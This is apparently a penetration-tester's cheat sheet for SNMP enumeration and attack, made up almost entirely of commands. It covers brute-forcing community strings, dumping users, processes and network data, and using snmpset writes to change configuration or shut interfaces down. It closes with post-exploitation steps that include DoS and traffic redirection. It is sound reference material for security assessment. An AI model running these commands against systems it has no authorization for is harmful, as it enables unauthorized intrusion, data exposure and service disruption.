# SNMP ENUMERATION (Port 161/162)

## PORT OVERVIEW
```
Port 161 - SNMP (UDP)
Port 162 - SNMP Trap (UDP)
```

## BANNER GRABBING & VERSION DETECTION
```bash
nmap -sU -p161 <IP>                             # UDP scan
nmap -sU -p161 --script snmp-info <IP>          # SNMP info
snmpwalk -v2c -c public <IP> system             # SNMP walk (version check)
onesixtyone <IP> public                         # Fast SNMP scanner
```

## SNMP COMMUNITY STRING BRUTEFORCE
```bash
# Default community strings
public                                          # Read-only (most common)
private                                         # Read-write
manager, cisco, community, snmp, secret

# Brute force community strings
onesixtyone -c /usr/share/wordlists/seclists/Discovery/SNMP/common-snmp-community-strings.txt <IP>
onesixtyone -c community.txt <IP>               # Custom wordlist

# Nmap brute force
nmap -sU -p161 --script snmp-brute <IP>
nmap -sU -p161 --script snmp-brute --script-args snmp-brute.communitiesdb=community.txt <IP>

# Hydra
hydra -P community.txt <IP> snmp                # Brute force community strings

# Metasploit
msfconsole -q -x "use auxiliary/scanner/snmp/snmp_login; set RHOSTS <IP>; run"
```

## SNMPWALK (ENUMERATE MIB TREE)
```bash
# SNMPv1/v2c enumeration
snmpwalk -v1 -c public <IP>                     # Walk entire MIB tree (v1)
snmpwalk -v2c -c public <IP>                    # Walk entire MIB tree (v2c)
snmpwalk -v2c -c public <IP> system             # System information
snmpwalk -v2c -c public <IP> 1.3.6.1.2.1.1      # System info (OID)

# Specific information
snmpwalk -v2c -c public <IP> hrSWInstalledName  # Installed software
snmpwalk -v2c -c public <IP> hrSWInstalledTable # Software table
snmpwalk -v2c -c public <IP> ipRouteTable       # Routing table
snmpwalk -v2c -c public <IP> ipNetToMediaTable  # ARP table
snmpwalk -v2c -c public <IP> tcpConnTable       # TCP connections
snmpwalk -v2c -c public <IP> udpTable           # UDP connections
```

## SNMP-CHECK (AUTOMATED ENUMERATION)
```bash
# snmp-check enumerates SNMP and presents info in readable format
snmp-check <IP> -c public                       # Default community
snmp-check <IP> -c public -v 2c                 # SNMP v2c
snmp-check <IP> -c private                      # Private community

# Returns:
# - System information (hostname, uptime, location)
# - Network information (interfaces, IPs, routes)
# - Network services (listening ports, processes)
# - Storage information (disks, partitions)
# - User accounts
# - Running processes
# - Installed software
```

## NMAP SNMP ENUMERATION
```bash
nmap -sU -p161 --script "snmp-*" <IP>           # All SNMP scripts
nmap -sU -p161 --script snmp-info <IP>          # Basic SNMP info
nmap -sU -p161 --script snmp-sysdescr <IP>      # System description
nmap -sU -p161 --script snmp-processes <IP>     # Running processes
nmap -sU -p161 --script snmp-interfaces <IP>    # Network interfaces
nmap -sU -p161 --script snmp-netstat <IP>       # Network connections
nmap -sU -p161 --script snmp-win32-users <IP>   # Windows users
nmap -sU -p161 --script snmp-win32-shares <IP>  # Windows shares
nmap -sU -p161 --script snmp-win32-software <IP>  # Installed software
```

## SNMPGET (SPECIFIC OID QUERIES)
```bash
# Query specific OID
snmpget -v2c -c public <IP> 1.3.6.1.2.1.1.1.0   # System description
snmpget -v2c -c public <IP> 1.3.6.1.2.1.1.5.0   # Hostname
snmpget -v2c -c public <IP> 1.3.6.1.2.1.1.3.0   # Uptime
snmpget -v2c -c public <IP> 1.3.6.1.2.1.1.4.0   # Contact info
snmpget -v2c -c public <IP> 1.3.6.1.2.1.1.6.0   # Location

# Multiple OIDs
snmpget -v2c -c public <IP> 1.3.6.1.2.1.1.1.0 1.3.6.1.2.1.1.5.0
```

## IMPORTANT SNMP OIDS
```bash
# System Information
1.3.6.1.2.1.1.1.0                               # System description
1.3.6.1.2.1.1.5.0                               # Hostname
1.3.6.1.2.1.1.3.0                               # Uptime
1.3.6.1.2.1.1.4.0                               # Contact
1.3.6.1.2.1.1.6.0                               # Location

# Network Information
1.3.6.1.2.1.4.20.1.1                            # IP addresses
1.3.6.1.2.1.4.21.1.1                            # Routing table
1.3.6.1.2.1.4.22.1.2                            # ARP cache (ipNetToMediaPhysAddress)

# Processes & Software
1.3.6.1.2.1.25.4.2.1.2                          # Running processes
1.3.6.1.2.1.25.6.3.1.2                          # Installed software

# Storage
1.3.6.1.2.1.25.2.3.1.3                          # Storage units
1.3.6.1.2.1.25.2.3.1.4                          # Storage size

# User accounts
1.3.6.1.4.1.77.1.2.25                           # Windows users (older)
1.3.6.1.2.1.25.4.2.1.1                          # User processes
```

## ENUMERATE WINDOWS SYSTEMS
```bash
# Windows-specific enumeration
snmpwalk -v2c -c public <IP> 1.3.6.1.4.1.77.1.2.25  # Users
snmpwalk -v2c -c public <IP> 1.3.6.1.2.1.25.4.2.1.2  # Running processes
snmpwalk -v2c -c public <IP> 1.3.6.1.2.1.25.6.3.1.2  # Installed software

# Shares
snmpwalk -v2c -c public <IP> 1.3.6.1.4.1.77.1.2.27  # Shares

# Network information
snmpwalk -v2c -c public <IP> 1.3.6.1.2.1.4.20.1.1  # IP addresses
snmpwalk -v2c -c public <IP> 1.3.6.1.2.1.4.22.1.2  # MAC addresses (ARP)

# Services
snmpwalk -v2c -c public <IP> 1.3.6.1.4.1.77.1.2.3.1.1  # Services
```

## ENUMERATE NETWORK DEVICES (CISCO, ETC)
```bash
# Cisco-specific OIDs
snmpwalk -v2c -c public <IP> 1.3.6.1.4.1.9.2.1  # Cisco local
snmpwalk -v2c -c public <IP> 1.3.6.1.4.1.9.9.23.1.2.1.1.4  # IOS version

# VLAN information
snmpwalk -v2c -c public <IP> 1.3.6.1.4.1.9.9.46.1.3.1.1.2  # VLANs

# Interface information
snmpwalk -v2c -c public <IP> 1.3.6.1.2.1.2.2.1.2  # Interface descriptions
snmpwalk -v2c -c public <IP> 1.3.6.1.2.1.2.2.1.6  # MAC addresses
```

## SNMPV3 ENUMERATION
```bash
# SNMPv3 uses authentication and encryption
# Requires username and password/auth key

# SNMPv3 with authentication
snmpwalk -v3 -u <username> -l authNoPriv -a MD5 -A <authpass> <IP>
snmpwalk -v3 -u <username> -l authPriv -a SHA -A <authpass> -x DES -X <privpass> <IP>

# Nmap SNMPv3 brute force
nmap -sU -p161 --script snmp-brute --script-args snmp-brute.protocol=3 <IP>
```

## MODIFY SNMP VALUES (WRITE COMMUNITY)
```bash
# If write community string is known (e.g., "private")
# Can modify system configuration

# Change hostname
snmpset -v2c -c private <IP> 1.3.6.1.2.1.1.5.0 s "NewHostname"

# Change contact info
snmpset -v2c -c private <IP> 1.3.6.1.2.1.1.4.0 s "attacker@evil.com"

# Shutdown interface (Cisco)
snmpset -v2c -c private <IP> 1.3.6.1.2.1.2.2.1.7.1 i 2

# WARNING: Only for authorized testing!
```

## METASPLOIT SNMP MODULES
```bash
msfconsole
use auxiliary/scanner/snmp/snmp_login           # Community string brute force
use auxiliary/scanner/snmp/snmp_enum            # SNMP enumeration
use auxiliary/scanner/snmp/snmp_enumshares      # Enumerate shares
use auxiliary/scanner/snmp/snmp_enumusers       # Enumerate users
use auxiliary/scanner/snmp/cisco_config_tftp    # Cisco config via TFTP
use auxiliary/scanner/snmp/cisco_upload_file    # Upload file to Cisco (RCE)
```

## EXTRACT SENSITIVE INFORMATION
```bash
# Information typically extractable via SNMP:
# - System information (OS, version, hostname)
# - Network configuration (IPs, subnets, routes, VLANs)
# - ARP cache (map network)
# - Running processes (find AV, security tools)
# - User accounts
# - Installed software (find vulnerable apps)
# - Network shares
# - Open ports and services
# - SNMP trap receivers (where alerts go)
# - Sometimes passwords (in device configs)
```

## SNMP TRAP RECEIVERS
```bash
# Find where SNMP traps are sent (monitoring systems)
snmpwalk -v2c -c public <IP> 1.3.6.1.6.3.1.1.4  # Trap receivers
snmpwalk -v2c -c public <IP> 1.3.6.1.4.1.8072.1.3.2.2.1.2  # Net-SNMP traps

# Could reveal management infrastructure
```

## COMMON MISCONFIGURATIONS
```
☐ Default community string "public" enabled
☐ Write community string "private" with default password
☐ SNMP accessible from internet
☐ SNMPv1/v2c used (no encryption)
☐ Sensitive information exposed (passwords, configs)
☐ No access control lists (ACLs)
☐ SNMP running on all interfaces
☐ Write access enabled unnecessarily
☐ SNMPv3 with weak authentication
☐ SNMP trap community string same as read community
```

## QUICK WIN CHECKLIST
```
☐ Test default community string "public"
☐ Brute force community strings
☐ Enumerate system information (OS, version)
☐ Enumerate user accounts
☐ Enumerate running processes (find AV)
☐ Enumerate network configuration (IPs, routes)
☐ Extract ARP cache (map network)
☐ Enumerate installed software
☐ Look for passwords in device configs
☐ Check for write access ("private" community)
```

## ONE-LINER FULL ENUMERATION
```bash
# Quick SNMP enumeration
onesixtyone -c /usr/share/wordlists/seclists/Discovery/SNMP/common-snmp-community-strings.txt <IP> && \
snmp-check <IP> -c public && \
nmap -sU -p161 --script snmp-info,snmp-processes,snmp-netstat <IP>

# Comprehensive SNMP walk
snmpwalk -v2c -c public <IP> > snmp_output.txt
```

## ADVANCED TECHNIQUES
```bash
# SNMP over IPv6
snmpwalk -v2c -c public udp6:[<IPv6>] system

# SNMP amplification attack (testing only)
# SNMP can be used for DDoS amplification
# Test if server responds to spoofed source IPs

# Extract Cisco configs via SNMP + TFTP
# Some Cisco devices allow config backup via SNMP
```

## POST-EXPLOITATION (AFTER SNMP ACCESS)
```bash
# After gaining SNMP access:
1. Enumerate all system information
2. Map network topology (IPs, routes, ARP)
3. Identify running services and processes
4. Extract user accounts
5. Identify installed software (find vulns)
6. Check for passwords in configs (network devices)
7. If write access: modify configurations
8. Disable interfaces (DoS)
9. Redirect traffic
10. Use as pivot point for network mapping

# Full enumeration script
for oid in 1.3.6.1.2.1.1 1.3.6.1.2.1.4 1.3.6.1.2.1.25; do
  echo "=== OID: $oid ==="
  snmpwalk -v2c -c public <IP> $oid
done
```
